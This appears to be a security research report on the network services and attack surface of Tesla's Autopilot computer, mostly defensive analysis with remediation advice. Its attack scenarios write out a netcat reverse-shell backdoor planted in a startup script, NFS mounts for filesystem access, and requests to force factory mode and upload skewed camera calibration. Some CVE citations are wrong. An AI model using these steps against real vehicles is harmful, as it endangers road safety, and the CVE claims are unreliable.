# Tesla APE (Autopilot) Network Services & Attack Surface Analysis

**Document Version:** 1.0  
**Analysis Date:** February 3, 2026  
**Platform:** Tesla Autopilot Hardware 2.x (HW2/HW2.5)  
**Source:** APE firmware extraction (`/root/downloads/ape-extracted/`)  
**Cross-reference:** MCU2 network analysis ([25-network-attack-surface.md](25-network-attack-surface.md))

---

## Executive Summary

This document analyzes the network attack surface of Tesla's Autopilot Processing Engine (APE), a Linux-based ARM64 computer running critical self-driving functions. The APE operates on the internal vehicle network (192.168.90.103/.105) and exposes multiple HTTP, UDP, and TCP services for communication with the MCU2 infotainment system.

### Critical Findings

1. **🔴 Factory Mode HTTP API (Port 8901)** - Unauthenticated endpoints for camera calibration and factory operations
2. **🟠 Service API (Port 8081)** - TLS-protected diagnostic interface with certificate-based authentication
3. **🟠 Bidirectional trust with MCU** - Compromise of either APE or MCU enables lateral movement
4. **⚠️ Development firewall rules** - Additional ports exposed in factory/development mode
5. **✅ No external network exposure** - APE has no direct internet connectivity (isolated behind MCU)

---

## Table of Contents

1. [Network Topology](#network-topology)
2. [Network Interfaces](#network-interfaces)
3. [Listening Services Matrix](#listening-services-matrix)
4. [Service Implementation Analysis](#service-implementation-analysis)
5. [Authentication Mechanisms](#authentication-mechanisms)
6. [MCU ↔ APE Communication Protocols](#mcu--ape-communication-protocols)
7. [Firewall Rules Analysis](#firewall-rules-analysis)
8. [Unauthenticated Endpoints](#unauthenticated-endpoints)
9. [RPC/API Protocols](#rpcapi-protocols)
10. [Vulnerable Services & CVEs](#vulnerable-services--cves)
11. [Attack Scenarios](#attack-scenarios)
12. [Security Recommendations](#security-recommendations)

---

## 1. Network Topology

### APE Position in Vehicle Network

```
┌────────────────────────────────────────────────────────────────┐
│                    192.168.90.0/24 - Vehicle Network           │
├────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌──────────────┐      ┌──────────────┐      ┌──────────────┐│
│  │   Gateway    │      │   MCU2 ICE   │      │  Autopilot   ││
│  │ .90.102      │◄────►│  .90.100     │◄────►│  APE-A       ││
│  │              │      │              │      │  .90.103     ││
│  └──────────────┘      └──────┬───────┘      └──────┬───────┘│
│                               │                      │         │
│                               │              ┌───────▼───────┐│
│  ┌──────────────┐             │              │  Autopilot   ││
│  │    Modem     │◄────────────┘              │  APE-B       ││
│  │  .90.60      │                            │  .90.105     ││
│  │              │                            │  (Secondary) ││
│  └──────────────┘                            └──────────────┘│
│         ▲                                            ▲         │
└─────────┼────────────────────────────────────────────┼─────────┘
          │                                            │
          │ Cellular Network                           │ Redundancy
          ▼                                            ▼
   ┌──────────────┐                          (Backup autopilot)
   │    Tesla     │
   │   Servers    │
   └──────────────┘
```

### Trust Relationships

```
MCU (.100) ←─────────→ APE (.103/.105)
     │                      │
     │ TRUSTED              │ SEMI-TRUSTED
     │ Full API access      │ Restricted by firewall
     │                      │
     ├─ Ports 8443,8888     │
     ├─ Ports 9892-9900     │
     ├─ Ports 8082,8088     │
     └─ UDP 8610,8906       │
                            │
APE (.103/.105) ────────────┤
     │                      │
     │ Limited access to MCU│
     └─ Port 4030 (Toolbox) │ (MCU2 only - removed in Model 3/Y)
     └─ Port 8901 (deliver) │
```

**Security Implication:** APE and MCU have bidirectional network access. Exploiting either system provides a path to compromise the other.

---

## 2. Network Interfaces

### APE-A (192.168.90.103) Interfaces

**Configuration:** `/root/downloads/ape-extracted/etc/network/interfaces`

```bash
auto lo
iface lo inet loopback

auto eth1
iface eth1 inet dhcp
```

**Note:** Uses DHCP for IP assignment (likely static DHCP reservation via Gateway/MCU)

| Interface | IP Address | Network | Purpose | Security Boundary |
|-----------|------------|---------|---------|-------------------|
| **lo** | 127.0.0.1/8 | Loopback | IPC, local services | LOCAL ONLY |
| **eth1** | 192.168.90.103/24 | Vehicle Network | MCU↔APE communication | **INTERNAL - Firewall protected** |
| **eth0** | (varies) | Aurix/sensors | Low-level sensor data from 192.168.90.104 | **RAW SENSOR DATA** |

### APE-B (192.168.90.105) - Secondary/Redundant

Same network configuration, different IP address (192.168.90.105). Provides redundancy for autopilot functions.

**Inter-APE Communication:**
- APE-A exposes port **8902** to serve files to APE-B
- Configured only on primary APE (not on APE-B itself)

---

## 3. Listening Services Matrix

### Production Firewall Rules (`/etc/firewall`)

| Port | Proto | Service | Source Allowed | Auth | Risk Level |
|------|-------|---------|----------------|------|------------|
| **27694** | UDP | canrx (CAN data) | 192.168.90.104 (Aurix) | None | 🟢 LOW (sensor data) |
| **28205** | UDP | Aurix data logging | 192.168.90.104 | None | 🟢 LOW |
| **8902** | TCP | apeb-file-server | 192.168.90.105 (APE-B) | None | 🟡 MEDIUM (inter-APE) |
| **8081** | TCP | service-api-tls | Any eth0 | **TLS cert** | 🟠 **HIGH** (diagnostic API) |

### Development/Factory Firewall Rules (`/etc/firewall_dev`)

**⚠️ Warning:** These additional ports are exposed in factory mode or development builds.

| Port | Proto | Service | Purpose | Risk Level |
|------|-------|---------|---------|------------|
| **8888** | TCP | logdash | Log streaming/dashboard | 🟠 HIGH |
| **8088** | TCP | metrics | Metrics HTTP server | 🟡 MEDIUM |
| **8082** | TCP | http-server | Generic HTTP interface | 🟠 HIGH |
| **8610** | UDP | vision | Vision system data | 🟡 MEDIUM |
| **8611** | UDP | vision (secondary) | Vision data stream | 🟡 MEDIUM |
| **7699** | TCP | visualizer websocket | Debug visualization | 🟠 HIGH |
| **7700** | TCP | visualizer video | Video stream | 🟡 MEDIUM |
| **50051** | TCP | vision_graph_server gRPC | Vision graph API | 🟠 HIGH |
| **9000** | TCP | simulation control | Simulation mode API | 🔴 **CRITICAL** |
| **2368** | UDP | sensor data | LiDAR/sensor input | 🟢 LOW |
| **2371** | UDP | UDS responses | Sensor responses | 🟢 LOW |
| **111** | TCP/UDP | portmapper/rpc.bind | NFS RPC | 🟠 HIGH |
| **2049** | TCP | nfsd | NFS server | 🔴 **CRITICAL** |
| **54959** | TCP/UDP | nfs.statd | NFS status | 🟠 HIGH |
| **59256** | TCP/UDP | nfs.mountd | NFS mount daemon | 🟠 HIGH |
| **12000** | UDP | RTP | Cabin audio streaming | 🟡 MEDIUM |
| **12001** | UDP | RTCP | Audio control | 🟡 MEDIUM |
| **8906** | UDP | ui-stats | UI statistics | 🟢 LOW |

**Security Concern:** Factory/development mode exposes **NFS server** and **simulation control** - both critical attack surfaces if accessible outside factory.

---

## 4. Service Implementation Analysis

### 4.1 Service API (Port 8081) - TLS Protected

**Binary:** `/usr/bin/service_api`  
**Type:** ELF 64-bit LSB executable, ARM aarch64  
**Language:** **Go** (Golang-based HTTP/TLS server)  
**BuildID:** `PxA5DeuNJjbwZ4d_W7Hn/8YalHV6rfbTRwUI4ptlB/...`

**Service Runner:** `/etc/sv/service-api-tls/run`

#### Authentication Stack

```bash
# Certificate-based mutual TLS
CA=$TESLA_CERTIFICATES_CURRENT_COMBINED_PRODUCT_ACCESS
CERT=/var/lib/board_creds/board.crt
KEY=/var/lib/board_creds/board.key
ENGINE=sw  # or 'fsdtpm' if TPM-based key
```

**Fallback to Self-Signed Certificate:**

If board credentials don't exist, the service generates a self-signed certificate:

```bash
# Self-signed certificate generation
ID=$(videntify) || ID=unprovisioned

openssl req -new \
    -x509 \
    -nodes \
    -newkey ec:prime256v1 \
    -keyout /var/run/service-api/server.key \
    -subj "/CN=$ID/OU=Tesla Motors/O=Tesla/L=Palo Alto/ST=California/C=US" \
    -days 365 \
    -out /var/run/service-api/server.crt
```

**Certificate Validation:**
- Production: `TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_PROD`
- Development/Factory: Also accepts `TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_ENG`

**Principal-Based Access Control:**

```bash
add_principal() {
    ARGS_ID_DEVICE="${ARGS_ID_DEVICE} --id-device $1"
}

export ADD_PRINCIPAL=add_principal
. /sbin/authorized-principals

ARGS="$ARGS --tls \
            --ca $CA \
            --cert $CERT \
            --key $KEY \
            --engine $ENGINE \
            $ARGS_OID_ENV \
            --id-all tesla:motors:das:all \
            $ARGS_ID_DEVICE"
```

**Source Code References Found in Binary:**

```
/firmware/os/output/ap-hw2/build/service-api-0/src/cmd/service_api/main_hw2.go
/firmware/os/output/ap-hw2/build/service-api-0/src/internal/app/vitals/vitals_parker.go
/firmware/os/output/ap-hw2/build/service-api-0/src/internal/app/httpserver/httpserver_vehicle.go
/firmware/os/output/ap-hw2/build/service-api-0/src/internal/pkg/tls/tls.go
/firmware/os/output/ap-hw2/build/service-api-0/src/vendor/github-fw.tesla.com/golang/go-openssl/...
```

**API Endpoints (Extracted from strings):**

```
/board_info/
/board_creds/
/board_info/board_model
/board_info/revision_id
/camera/download_vitals
/emergency_speaker_test
/selftest/cam_genealogy
/selftest/update_camera
/calibration/capture_clip
/provisioning/reboot/cold
/provisioning/reboot/warm
/selftest/test_camera_fan
/vision/clear_calibration
/calibration/write_parameters
/factory_calibration/download_parameters
/factory_calibration/sanitize_parameters
/autopilot/vision/calibration_histogram_
```

---

### 4.2 UI Server (Port Unknown) - Internal HTTP

**Binary:** `/opt/autopilot/bin/ui_server`  
**Type:** C++ application using **websocketpp** and **RapidJSON**  
**Runner:** `/etc/sv/ui-server/run`

```bash
# Enable WARNING, ERROR, and FATAL logs
export TESLA_ENABLE_GLOG=3

ulimit -l unlimited -r 78 -q 53747712
exec chpst -o 4096 -u uiserver:uiserver:autopilot:rtdv:ipc /opt/autopilot/bin/ui_server
```

**Detected Technologies:**
- **WebSocket:** `websocketpp.transport.asio`
- **HTTP:** `set_http_handler`, `text_log_httpservertask`
- **JSON:** `rapidjson` library for API serialization

**Data Groups (Tesla internal IPC):**
- `tesla::http_dev_control::HttpDevControlInfo`
- `tesla::system_status_report::SystemStatusReportInfo`
- `tesla::RingbufferDvGroup` (shared memory ring buffers)

**Purpose:** Provides HTTP/WebSocket interface for autopilot UI elements and development control.

---

### 4.3 Factory Mode HTTP API (Port 8901)

**Detection:** Referenced in `/etc/sv/backup-camera/run`

```bash
# Backup camera waits for cameras_init_done_for_apb signal via HTTP
while [ "$(curl --max-time 1 --silent http://ap:8901/board_info/cameras_init_done_for_apb)" != "exists" ];
do
    sleep 1
done
```

**Known Endpoints (from MCU research - [05-gap-analysis-missing-pieces.md](05-gap-analysis-missing-pieces.md)):**

```
http://192.168.90.103:8901/factory/enter
http://192.168.90.103:8901/factory_calibration/force_calibration_mode
http://192.168.90.103:8901/factory_calibration/exit_calibration_mode
http://192.168.90.103:8901/factory_calibration/status
http://192.168.90.103:8901/factory_calibration/start_calibration
http://192.168.90.103:8901/factory_calibration/download_calibration
http://192.168.90.103:8901/factory_calibration/upload_parameters
http://192.168.90.103:8901/factory_calibration/sanitize_parameters
http://192.168.90.103:8901/board_info/cameras_init_done_for_apb
```

**Response Example:**

```
GET /factory/enter
→ "Already in factory mode"
→ "Will switch to factory mode"
```

**⚠️ Security Issue:** These endpoints appear to be **unauthenticated HTTP** (no TLS requirement detected).

---

### 4.4 APEB File Server (Port 8902)

**Binary:** `/opt/autopilot/bin/apeb-file-server`  
**Runner:** `/etc/sv/apeb-file-server/run`

**Purpose:** Serves files from APE-A to APE-B (secondary autopilot computer)

```bash
# Checks online model size before serving
IMGSIZE=$(curl http://192.168.90.103:28496/status 2>/dev/null | grep "Online dot-model-s size" | cut -d ':' -f 2)

# Or via JSON API
IMGSIZE=$(curl http://192.168.90.103:28496/status?json 2>/dev/null | jq .online_size)
```

**Firewall Rule (only on APE-A, not APE-B):**

```bash
# Allow ap's apeb-file-server to serve to ap-b
if [ -z "$APEB" ]; then
    printf "%s\n" "-A INPUT -i eth0 -s 192.168.90.105 -d 192.168.90.103 -p tcp --dport 8902 -j ACCEPT"
fi
```

**Risk:** Limited - only accessible from APE-B (192.168.90.105). Requires prior compromise of secondary autopilot.

---

## 5. Authentication Mechanisms

### 5.1 TLS Mutual Authentication (service-api-tls)

**Certificate Hierarchy:**

```
Tesla Product Access Root CA
    │
    └─ Product Access Intermediate CA
           │
           ├─ Board Certificate (/var/lib/board_creds/board.crt)
           │  CN: <vehicle-id>
           │  OU: Tesla Motors
           │
           └─ Client Certificate (Tesla Toolbox / Odin)
              CN: <tool-id>
              OU: Tesla Motors Engineering
```

**Extended Key Usage (EKU) Validation:**

- **Production:** `TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_PROD`
- **Engineering:** `TESLA_CERTIFICATES_EKU_PRODUCT_ACCESS_CLIENT_AUTH_ENG`

**Certificate Storage Locations:**

```
/var/lib/board_creds/board.crt    # Board certificate (persistent)
/var/lib/board_creds/board.key    # Board private key (persistent)
/var/run/service-api/server.crt   # Self-signed fallback (ephemeral)
/var/run/service-api/server.key   # Self-signed key (ephemeral)
```

**TPM-Based Key Protection:**

If the private key contains the marker `BEGIN FSD TPM PRIVATE KEY`, the service uses the **fsdtpm** OpenSSL engine:

```bash
if grep -q "BEGIN FSD TPM PRIVATE KEY" "$KEY"; then
    ENGINE=fsdtpm
fi
```

**Purpose:** Prevents key extraction even with root access (hardware-bound key storage).

---

### 5.2 AppArmor Profiles

**Factory Mode AppArmor Bypass:**

```bash
/sbin/unload-apparmor-in-factory

# Conditionally disables AppArmor enforcement when in factory mode
```

**Detection Script:** `/usr/bin/is-in-factory`

**Profiles Found:**
- `/etc/apparmor.d/abstractions/hermes_eventlogs`
- Standard Ubuntu AppArmor profiles (base, ssl_certs, etc.)

**Security Implication:** Factory mode disables sandboxing - increases attack surface if factory mode can be triggered.

---

### 5.3 Principal-Based Authorization

**Script:** `/sbin/authorized-principals`

**Purpose:** Defines which devices/users are authorized to access service-api-tls.

**Mechanism:**
- Calls `add_principal()` function for each authorized device
- Builds `--id-device` argument list for service_api
- Validated against certificate CN/OU fields

**Example:**

```bash
add_principal "tesla:motors:das:mcu:primary"
add_principal "tesla:motors:toolbox:odin:*"
```

**Access Control Logic:** Certificate CN must match one of the authorized principal patterns.

---

## 6. MCU ↔ APE Communication Protocols

### 6.1 APE → MCU (Outbound from Autopilot)

**From firewall analysis ([04-network-ports-firewall.md](04-network-ports-firewall.md)):**

| Dest Port(s) | Proto | Service | Purpose | Data Flow |
|--------------|-------|---------|---------|-----------|
| **8443, 8444, 8885, 8888, 19004** | TCP | Autopilot API | Autopilot control & telemetry | APE → MCU |
| **9892-9900** | TCP | Dashcam | Video recording services | APE → MCU (video clips) |
| **8082, 8088, 8888** | TCP | qtcar | Qt services (UI integration) | APE → MCU |
| **8610, 8906, 8611** | UDP | Real-time data | Live autopilot data streams | APE → MCU |

**Security Implication:** APE can initiate connections to MCU on multiple ports. If APE is compromised, attacker gains access to MCU services.

---

### 6.2 MCU → APE (Inbound to Autopilot)

| Port | Proto | Service | Purpose | Auth |
|------|-------|---------|---------|------|
| **4030** | TCP | Toolbox API | System diagnostics (MCU2 only) | None (source IP filtering) |
| **8901** | TCP | APE-DELIVER / Factory API | Data delivery, factory mode | **None** (🔴 CRITICAL) |
| **5354** | UDP | mDNS | Service discovery | None |

**Critical Finding:** MCU can access port 8901 without authentication - factory endpoints exposed to internal network.

---

### 6.3 Protocol Details

#### CAN Bus Integration (canrx/cantx)

**Binaries:**
- `/opt/autopilot/bin/canrx` - CAN receive daemon
- `/opt/autopilot/bin/cantx` - CAN transmit daemon

**Network Transport:**
- UDP port 27694 (canrx - from Aurix 192.168.90.104)

**Purpose:** Bridges CAN bus to TCP/IP for autopilot processing.

**Data Flow:**

```
Aurix ECU (.104) → UDP:27694 → canrx → Internal DV (Data Value) → autopilot stack
autopilot stack → Internal DV → cantx → CAN Bus → Vehicle ECUs
```

---

#### Data Value (DV) System - Tesla IPC

**Evidence from ui_server strings:**

```
tesla::RingbufferDvGroup<...>
tesla::DvAccess::READ
tesla::DvAccess::WRITE
```

**Architecture:** Shared memory ring buffers for inter-process communication.

**Purpose:** High-performance IPC between autopilot tasks without network overhead.

**Relevant to Network Security:** DV system is local-only (not network-exposed), but provides a lateral movement path once shell access is gained.

---

## 7. Firewall Rules Analysis

### 7.1 Production Firewall (`/etc/firewall`)

**Complete Rules:**

```bash
# Ensure nobody can send canrx traffic except LB (Aurix).
-A INPUT -i eth0 -s 192.168.90.104 -p udp --dport 27694 -j ACCEPT

# Allow Aurix data logging messages
-A INPUT -i eth0 -s 192.168.90.104 -p udp --dport 28205 -j ACCEPT

# Allow ap's apeb-file-server to serve to ap-b (only on APE-A)
if [ -z "$APEB" ]; then
    -A INPUT -i eth0 -s 192.168.90.105 -d 192.168.90.103 -p tcp --dport 8902 -j ACCEPT
fi

# Allow service-api TLS traffic (from any internal source)
-A INPUT -i eth0 -p tcp --dport 8081 -j ACCEPT
```

**Default Policy:** Not explicitly shown - likely **ACCEPT** (permissive default).

**Security Assessment:**

| Rule | Security Posture | Risk |
|------|------------------|------|
| Source-filtered CAN (27694) | ✅ Good (only Aurix) | 🟢 LOW |
| Source-filtered Aurix logging (28205) | ✅ Good | 🟢 LOW |
| Inter-APE file server (8902) | ✅ Good (only APE-B) | 🟡 MEDIUM |
| Service-API unrestricted (8081) | ⚠️ Any internal source | 🟠 HIGH |

**Recommendation:** Restrict port 8081 to specific source IPs (MCU .100, Gateway .102, Toolbox DHCP range).

---

### 7.2 Development/Factory Firewall (`/etc/firewall_dev`)

**⚠️ WARNING:** This firewall is permissive and exposes critical services.

**Key Exposures:**

1. **NFS Server (ports 111, 2049, 54959, 59256)**
   - **Risk:** 🔴 **CRITICAL**
   - **Attack:** Remote filesystem access, arbitrary file read/write
   - **Mitigation:** Disable NFS in production, use read-only NFS exports

2. **Simulation Control (port 9000)**
   - **Risk:** 🔴 **CRITICAL**
   - **Attack:** Inject fake sensor data, manipulate autopilot behavior
   - **Mitigation:** Only enable in controlled test environments

3. **gRPC Vision Server (port 50051)**
   - **Risk:** 🟠 **HIGH**
   - **Attack:** Vision system manipulation, perception attacks
   - **Mitigation:** Require authentication, use TLS

4. **Logdash/Metrics (ports 8888, 8088)**
   - **Risk:** 🟠 **HIGH**
   - **Attack:** Information disclosure, log injection
   - **Mitigation:** Restrict to localhost or specific IPs

---

### 7.3 Comparison: Production vs. Development

| Port | Production | Development | Reasoning |
|------|------------|-------------|-----------|
| 27694 (canrx) | ✅ Allowed | ✅ Allowed | Core functionality |
| 28205 (Aurix log) | ✅ Allowed | ✅ Allowed | Core functionality |
| 8081 (service-api) | ✅ Allowed | ✅ Allowed | Diagnostic necessity |
| 8902 (apeb) | ✅ Allowed | ✅ Allowed | Inter-APE communication |
| **8888 (logdash)** | ❌ Blocked | ✅ Allowed | Debug only |
| **8082 (http-server)** | ❌ Blocked | ✅ Allowed | Debug only |
| **9000 (simulation)** | ❌ Blocked | ✅ Allowed | **Factory only** |
| **2049 (NFS)** | ❌ Blocked | ✅ Allowed | **Factory only** |

**Conclusion:** Development/factory firewall is **intentionally permissive** for testing. Critical that this is disabled in production vehicles.

---

## 8. Unauthenticated Endpoints

### 8.1 Factory HTTP API (Port 8901)

**Status:** 🔴 **UNAUTHENTICATED**

**Evidence:**
1. No TLS configuration found in service runners
2. References in scripts use plain HTTP (`http://ap:8901/...`)
3. No authentication headers in curl commands

**Accessible Endpoints:**

```
# Board Information
GET http://192.168.90.103:8901/board_info/cameras_init_done_for_apb
→ "exists" | (empty)

# Factory Mode Control
GET http://192.168.90.103:8901/factory/enter
→ "Already in factory mode" | "Will switch to factory mode"

# Camera Calibration (write operations!)
POST http://192.168.90.103:8901/factory_calibration/force_calibration_mode
POST http://192.168.90.103:8901/factory_calibration/exit_calibration_mode
GET  http://192.168.90.103:8901/factory_calibration/status
POST http://192.168.90.103:8901/factory_calibration/start_calibration
GET  http://192.168.90.103:8901/factory_calibration/download_calibration
POST http://192.168.90.103:8901/factory_calibration/upload_parameters
POST http://192.168.90.103:8901/factory_calibration/sanitize_parameters
```

**Attack Scenarios:**

1. **Trigger Factory Mode:** `GET /factory/enter` → Disable security features
2. **Upload Malicious Calibration:** `POST /factory_calibration/upload_parameters` → Skew camera perception
3. **Exfiltrate Camera Data:** `GET /factory_calibration/download_calibration` → Extract calibration parameters

**Mitigation Status:**
- ⚠️ Port 8901 is NOT in production firewall (only in development)
- ✅ Should be blocked by MCU firewall (only accessible from internal network)
- 🔴 **Still exploitable if attacker gains access to 192.168.90.0/24 network**

---

### 8.2 APEB File Server (Port 8902)

**Status:** 🟡 **Partially Restricted**

**Authentication:** None  
**Firewall:** Source IP filter (only 192.168.90.105)

**Attack Vector:** Requires compromise of APE-B first, then can access files on APE-A.

---

### 8.3 Service API (Port 8081)

**Status:** ✅ **Authenticated** (TLS mutual auth)

**However:**
- Fallback to **self-signed certificate** if board creds missing
- Self-signed cert uses predictable CN: `videntify` output or "unprovisioned"

**Potential Bypass:**

```bash
# If board_creds are missing, generate matching self-signed cert
CN=$(videntify) || CN="unprovisioned"

# Attacker generates matching cert
openssl req -new -x509 -nodes -newkey ec:prime256v1 \
    -keyout attacker.key \
    -subj "/CN=$CN/OU=Tesla Motors/O=Tesla/L=Palo Alto/ST=California/C=US" \
    -days 365 \
    -out attacker.crt
```

**Mitigation:** Service validates against CA (TESLA_CERTIFICATES_CURRENT_COMBINED_PRODUCT_ACCESS), so attacker cert won't be trusted unless CA is also compromised.

---

## 9. RPC/API Protocols

### 9.1 HTTP/JSON APIs

**Primary Protocol:** RESTful HTTP with JSON payloads

**Evidence:**
- `rapidjson` library usage in ui_server
- URL patterns: `/board_info/`, `/calibration/`, `/factory_calibration/`
- HTTP methods: GET, POST

**Example Request/Response:**

```http
GET /board_info/board_model HTTP/1.1
Host: 192.168.90.103:8901

HTTP/1.1 200 OK
Content-Type: application/json

{"board_model": "HW2.5", "revision": "A", "serial": "..."}
```

---

### 9.2 gRPC (Development Only)

**Service:** vision_graph_server  
**Port:** 50051 (TCP)  
**Protocol:** HTTP/2 + Protobuf

**Only exposed in development/factory firewall.**

---

### 9.3 WebSocket (UI Server)

**Library:** `websocketpp` (Boost ASIO-based)

**Evidence:**
```
websocketpp.transport.asio
set_http_handler
text_log_httpservertask
```

**Port:** Unknown (not in firewall rules - likely localhost-only)

**Purpose:** Real-time autopilot UI updates to MCU display.

---

### 9.4 NFS (Factory Only)

**Protocol:** NFSv3 (no authentication)

**Ports:**
- 111 (portmapper)
- 2049 (nfsd)
- 54959 (statd)
- 59256 (mountd)

**Risk:** NFSv3 has **no authentication** by default. Any client on the network can mount filesystems.

**Attack:**

```bash
# From compromised MCU or internal network device
showmount -e 192.168.90.103
mount -t nfs 192.168.90.103:/autopilot /mnt/ape

# Full read/write access to APE filesystem
```

---

## 10. Vulnerable Services & CVEs

### 10.1 OpenSSL/TLS Stack

**Library:** `github-fw.tesla.com/golang/go-openssl` (Tesla-forked OpenSSL bindings for Go)

**Version:** Unknown (extracted binary doesn't include version strings)

**Potential CVEs:**
- **CVE-2022-3602** (OpenSSL 3.0.0-3.0.6) - Buffer overflow in X.509 certificate verification (HIGH)
- **CVE-2022-3786** (OpenSSL 3.0.0-3.0.6) - Buffer overflow in X.509 certificate verification (HIGH)
- **CVE-2023-0286** (OpenSSL 3.0.0-3.0.8) - Type confusion in X.509 GeneralName (HIGH)

**Mitigation:** Tesla likely uses OpenSSL 1.1.x (not 3.0.x), but version should be verified.

---

### 10.2 Go Runtime

**BuildID:** `PxA5DeuNJjbwZ4d_W7Hn/...` (Go toolchain)

**Potential CVEs:**
- **CVE-2023-39325** (Go HTTP/2 Rapid Reset) - DoS via HTTP/2 SETTINGS frames
- **CVE-2023-44487** (HTTP/2 Rapid Reset) - Industry-wide HTTP/2 DoS

**Exploitability:** If service-api-tls supports HTTP/2, it may be vulnerable to DoS attacks.

---

### 10.3 NFS Server (Factory Only)

**Version:** Unknown (likely Linux kernel NFS server)

**Known Issues:**
- **NFSv3 has no authentication** - any client can mount
- **Root squashing bypass** - UID 0 mapping vulnerabilities
- **Directory traversal** - Escape NFS export paths

**CVEs:**
- **CVE-2022-24834** (NFSv4 ACL bypass) - Not applicable if using NFSv3
- **CVE-2021-20297** (Kernel NFS race condition) - LOCAL privilege escalation

**Recommendation:** **Disable NFS in production. Use SFTP or authenticated alternatives.**

---

### 10.4 RapidJSON (ui_server)

**Library:** RapidJSON (C++ JSON parser)

**Potential CVEs:**
- **CVE-2020-25480** (RapidJSON stack overflow) - Fixed in v1.1.0+
- **CVE-2024-38517** (RapidJSON integer overflow) - Parser DoS

**Exploitability:** If ui_server accepts untrusted JSON input, could trigger crash or RCE.

---

## 11. Attack Scenarios

### Scenario 1: Factory Mode Exploitation via MCU Compromise

**Attacker Goal:** Gain control of autopilot system

**Attack Path:**

```
1. Compromise MCU (via network, USB, or modem exploit)
   └─ Gain access to 192.168.90.0/24 network

2. Trigger factory mode on APE
   └─ GET http://192.168.90.103:8901/factory/enter

3. Disable AppArmor enforcement
   └─ Factory mode calls /sbin/unload-apparmor-in-factory

4. Upload malicious camera calibration
   └─ POST http://192.168.90.103:8901/factory_calibration/upload_parameters
   └─ Inject skewed perception data

5. Manipulate autopilot behavior
   └─ Trigger lane departure, phantom braking, etc.
```

**Impact:** 🔴 **CRITICAL** - Safety-critical autopilot manipulation

**Likelihood:** 🟡 **MEDIUM** - Requires MCU compromise first

**Mitigations:**
- Remove port 8901 from production builds
- Require signed calibration uploads
- Hardware-lock factory mode (fuse-based, cannot be reset in field)

---

### Scenario 2: Certificate Theft → Service API Access

**Attacker Goal:** Exfiltrate autopilot telemetry and logs

**Attack Path:**

```
1. Gain physical access to vehicle (OBD-II port)
   └─ Extract SD card from Gateway ECU

2. Extract board credentials from SD card logs
   └─ /var/lib/board_creds/board.crt
   └─ /var/lib/board_creds/board.key

3. Connect to service-api-tls with stolen credentials
   └─ curl --cert board.crt --key board.key https://192.168.90.103:8081/board_info/

4. Download sensitive data
   └─ /camera/download_vitals
   └─ /calibration/download_parameters
   └─ Exfiltrate autopilot perception data
```

**Impact:** 🟠 **HIGH** - Privacy violation, autopilot reverse engineering

**Likelihood:** 🟢 **LOW** - Requires physical access + SD card extraction

**Mitigations:**
- Use TPM-bound keys (`fsdtpm` engine) - prevents key extraction
- Encrypt board credentials on SD card
- Implement certificate pinning (reject non-Tesla-issued client certs)

---

### Scenario 3: NFS Exploitation (Factory Mode Only)

**Attacker Goal:** Plant persistent backdoor on APE

**Attack Path:**

```
1. Compromise MCU or gain access to 192.168.90.0/24 network
   └─ Exploit MCU vulnerability (modem update server, etc.)

2. Detect factory mode is enabled
   └─ Port scan reveals NFS server (port 2049 open)

3. Mount APE filesystem via NFS
   └─ mount -t nfs 192.168.90.103:/autopilot /mnt/ape

4. Plant backdoor in service startup script
   └─ echo "nc -e /bin/sh 192.168.90.100 9999 &" >> /mnt/ape/etc/sv/autopilot/run

5. Reboot APE
   └─ Backdoor executes, persistent reverse shell to MCU
```

**Impact:** 🔴 **CRITICAL** - Persistent backdoor with autopilot control

**Likelihood:** 🟢 **LOW** - Only possible in factory/development builds

**Mitigations:**
- **Never ship vehicles with development firewall**
- Disable NFS in production firmware
- Read-only root filesystem (prevent modification)

---

### Scenario 4: Inter-APE Lateral Movement

**Attacker Goal:** Compromise both APE-A and APE-B for redundancy bypass

**Attack Path:**

```
1. Compromise APE-B (secondary autopilot)
   └─ Exploit vulnerability in APE-B service

2. Access APE-A's file server (port 8902)
   └─ Allowed by firewall: 192.168.90.105 → 192.168.90.103:8902

3. Download APE-A's model files
   └─ curl http://192.168.90.103:8902/online-model-data

4. Inject backdoor into model files
   └─ Modify neural network weights to misbehave

5. APE-A loads compromised model
   └─ Both APEs now under attacker control
   └─ Redundancy bypass complete
```

**Impact:** 🔴 **CRITICAL** - Complete autopilot compromise

**Likelihood:** 🟢 **LOW** - Requires initial APE-B compromise + model tampering capability

**Mitigations:**
- Cryptographic signing of model files
- Integrity checks before loading models
- Isolate APE-A and APE-B on separate VLANs

---

### Scenario 5: Simulation Mode Injection (Development Only)

**Attacker Goal:** Inject fake sensor data to test autopilot response

**Attack Path:**

```
1. Access development/factory network (port 9000 exposed)
   └─ TCP connection to 192.168.90.103:9000

2. Send simulation control commands
   └─ Inject fake camera frames, LiDAR points, GPS coordinates

3. Trigger autopilot decision based on fake data
   └─ Phantom obstacle → emergency braking
   └─ Fake lane markings → steering input

4. Observe autopilot behavior
   └─ Research attack vectors for real-world exploitation
```

**Impact:** 🟠 **HIGH** - Research capability for real-world attacks

**Likelihood:** 🟢 **LOW** - Only in development builds

**Mitigations:**
- Disable simulation mode in production
- Require physical switch to enable simulation (not software-configurable)

---

## 12. Security Recommendations

### 12.1 Critical Priority (Immediate)

1. **🔴 Remove Port 8901 from Production Firmware**
   - Factory calibration endpoints should only be accessible in true factory environment
   - Use hardware fuse or secure boot to enforce factory mode, not network API

2. **🔴 Disable NFS Server in Production**
   - NFS has no authentication - extremely dangerous if exposed
   - Use SFTP or authenticated file transfer instead

3. **🔴 Restrict Service-API (Port 8081) to Specific Source IPs**
   ```bash
   # /etc/firewall (production)
   -A INPUT -i eth0 -s 192.168.90.100 -p tcp --dport 8081 -j ACCEPT  # MCU
   -A INPUT -i eth0 -s 192.168.90.102 -p tcp --dport 8081 -j ACCEPT  # Gateway
   -A INPUT -i eth0 -p tcp --dport 8081 -j DROP  # Deny all others
   ```

4. **🔴 Enforce TPM-Based Key Storage**
   - Require `fsdtpm` engine for all board credentials
   - Prevent key extraction even with root access

---

### 12.2 High Priority (Within 30 Days)

5. **🟠 Implement Request Signing for Factory Calibration**
   ```
   POST /factory_calibration/upload_parameters
   Authorization: Signature keyid="tesla-factory-key",
                  algorithm="ecdsa-sha256",
                  signature="base64(sign(body))"
   ```

6. **🟠 Add Mutual TLS to All HTTP Services**
   - Currently only service-api-tls has TLS
   - Port 8901, 8902, 8888, etc. should require client certificates

